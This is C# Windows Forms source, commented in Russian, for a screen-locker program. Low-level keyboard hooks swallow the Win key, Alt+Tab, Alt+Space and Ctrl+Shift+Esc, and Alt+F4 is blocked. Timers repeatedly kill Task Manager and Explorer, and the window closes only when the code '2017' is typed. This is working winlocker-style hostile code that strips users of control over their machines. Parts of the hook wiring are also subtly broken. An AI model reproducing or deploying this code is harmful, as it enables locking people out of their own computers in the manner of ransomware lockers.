using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace WindowsFormsApplication8
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            timer1.Enabled = true;
            m_callback_1 = LowLevelKeyboardHookProc_alt_tab;
            m_hHook_1 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_1, GetModuleHandle(IntPtr.Zero), 0);
            m_callback_5 = LowLevelKeyboardHookProc_alt_space;
            m_hHook_5 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_5, GetModuleHandle(IntPtr.Zero), 0);
            m_callback = LowLevelKeyboardHookProc_win;
            m_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback, GetModuleHandle(IntPtr.Zero), 0);
            m_callback_6 = LowLevelKeyboardHookProc_control_shift_escape;
            m_hHook_6 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_6, GetModuleHandle(IntPtr.Zero), 0);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text += "1";
        }
        private void button2_Click(object sender, EventArgs e)
        {
            textBox1.Text += "4";
        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox1.Text += "7";
        }

        private void button4_Click(object sender, EventArgs e)
        {
            textBox1.Text += "2";
        }

        private void button5_Click(object sender, EventArgs e)
        {
            textBox1.Text += "5";
        }

        private void button6_Click(object sender, EventArgs e)
        {
            textBox1.Text += "8";
        }

        private void button7_Click(object sender, EventArgs e)
        {
            textBox1.Text += "3";
        }

        private void button8_Click(object sender, EventArgs e)
        {
            textBox1.Text += "6";
        }

        private void button9_Click(object sender, EventArgs e)
        {
            textBox1.Text += "9";
        }

        private void button10_Click(object sender, EventArgs e)
        {
            textBox1.Text += "0";
        }

        private void button11_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "2017") this.Close();
        }

        private void button12_Click(object sender, EventArgs e)
        {
            string text = textBox1.Text;
            if (text.Length>0)
                text = text.Remove(text.Length - 1, 1);
            textBox1.Text = text;
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                string name = "taskmgr";
                Process[] etc = Process.GetProcesses();
                foreach (Process anti in etc)
                    if (anti.ProcessName.ToLower().Contains(name.ToLower())) anti.Kill();
            }
            catch
            { }
        }
        private delegate IntPtr LowLevelKeyboardProcDelegate(int nCode, IntPtr wParam, IntPtr lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, IntPtr hMod, int dwThreadId);
        private const int WH_KEYBOARD_LL = 13;
        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
        }

        //Using callbacks
        private LowLevelKeyboardProcDelegate m_callback;
        private LowLevelKeyboardProcDelegate m_callback_1;
        private LowLevelKeyboardProcDelegate m_callback_2;
        private LowLevelKeyboardProcDelegate m_callback_3;
        private LowLevelKeyboardProcDelegate m_callback_4;
        private LowLevelKeyboardProcDelegate m_callback_5;
        private LowLevelKeyboardProcDelegate m_callback_6;
        private LowLevelKeyboardProcDelegate m_callback_7;

        //переменные для разблокировки клавиатуры
        private IntPtr m_hHook;
        private IntPtr m_hHook_1;
        private IntPtr m_hHook_2;
        private IntPtr m_hHook_3;
        private IntPtr m_hHook_4;
        private IntPtr m_hHook_5;
        private IntPtr m_hHook_6;
        private IntPtr m_hHook_7;
        //Разблокировка клавиатуры
        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        //Hook handle
        [System.Runtime.InteropServices.DllImport("Kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(IntPtr lpModuleName);

        //Вызов следующего хука
        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        //Захват <WinKey> 
        public IntPtr LowLevelKeyboardHookProc_win(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo =
                 (KBDLLHOOKSTRUCT)System.Runtime.InteropServices.Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
                if (objKeyInfo.key == Keys.RWin ||
                    objKeyInfo.key == Keys.LWin)
                {
                    return (IntPtr)1;//<WinKey> 
                }
            }
            return CallNextHookEx(m_hHook_1, nCode, wParam, lParam);
        }
        //Блокировка <Alt>+<Tab> 
        public IntPtr LowLevelKeyboardHookProc_alt_tab(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo =
                 (KBDLLHOOKSTRUCT)System.Runtime.InteropServices.Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
                if (objKeyInfo.key == Keys.Alt ||
                    objKeyInfo.key == Keys.Tab)
                {
                    return (IntPtr)1;//<Alt>+<Tab> blocking
                }
            }
            return CallNextHookEx(m_hHook, nCode, wParam, lParam);
        }

        //Блокировка <Alt>+<Space> 
        public IntPtr LowLevelKeyboardHookProc_alt_space(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo =
                    (KBDLLHOOKSTRUCT)System.Runtime.InteropServices.Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
                if (objKeyInfo.key == Keys.Alt ||
                    objKeyInfo.key == Keys.Space)
                {
                    return (IntPtr)1;//<Alt>+<Space> 
                }
            }
            return CallNextHookEx(m_hHook_5, nCode, wParam, lParam);
        }
        //Настройки хука
        public void SetHook()
        {
            //Hooks callbacks by delegate
            m_callback = LowLevelKeyboardHookProc_win;
            m_callback_1 = LowLevelKeyboardHookProc_alt_tab;
            m_callback_5 = LowLevelKeyboardHookProc_alt_space;
            m_callback_6 = LowLevelKeyboardHookProc_control_shift_escape;

            //Настройки перехвата
            m_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_1 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_1, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_2 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_2, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_3 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_3, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_4 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_4, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_5 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_5, GetModuleHandle(IntPtr.Zero), 0);
            m_hHook_6 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_6, GetModuleHandle(IntPtr.Zero), 0);
        }
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == (Keys.Alt | Keys.F4))
            {
                return true;
            }
            //return base.ProcessCmdKey(ref msg, keyData);
            return true;
        }
        //Блокировка <Control>+<Shift>+<Escape> 
        public IntPtr LowLevelKeyboardHookProc_control_shift_escape(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo =
                 (KBDLLHOOKSTRUCT)System.Runtime.InteropServices.Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
                if (objKeyInfo.key == Keys.LControlKey ||
                    objKeyInfo.key == Keys.RControlKey ||
                    objKeyInfo.key == Keys.LShiftKey ||
                    objKeyInfo.key == Keys.RShiftKey ||
                    objKeyInfo.key == Keys.Escape)
                {
                    return (IntPtr)1;//<Control>+<Shift>+<Escape> 
                }
            }
            return CallNextHookEx(m_hHook_6, nCode, wParam, lParam);//Go to next hook
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            try
            {
                string name = "explorer";
                Process[] etc = Process.GetProcesses();
                foreach (Process anti in etc)
                    if (anti.ProcessName.ToLower().Contains(name.ToLower())) anti.Kill();
            }
            catch
            { }
        }
    }
}
